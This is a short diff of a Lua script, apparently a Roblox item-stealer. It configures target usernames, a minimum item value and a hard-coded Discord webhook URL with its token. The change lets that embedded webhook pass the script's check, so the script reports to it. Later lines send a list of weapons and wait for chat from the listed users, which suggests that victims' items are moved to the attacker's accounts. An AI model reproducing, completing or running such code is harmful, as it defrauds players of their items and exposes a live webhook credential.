@@ -10,7 +10,7 @@ local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1429725379719073880/dyip9tvqFAuz2oaol1fTh9ZSOCv3vIdSDNC8VEM5Gl7_PdDq6lQe9mqAP_DCtYeGVkSr"
 
-if next(users) == nil or webhook == "https://discord.com/api/webhooks/1429725379719073880/dyip9tvqFAuz2oaol1fTh9ZSOCv3vIdSDNC8VEM5Gl7_PdDq6lQe9mqAP_DCtYeGVkSr" then
+if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
     return
 end
@@ -501,5 +501,6 @@ if #weaponsToSend > 0 then
     end
     waitForUserChat()
 end
+
 
 
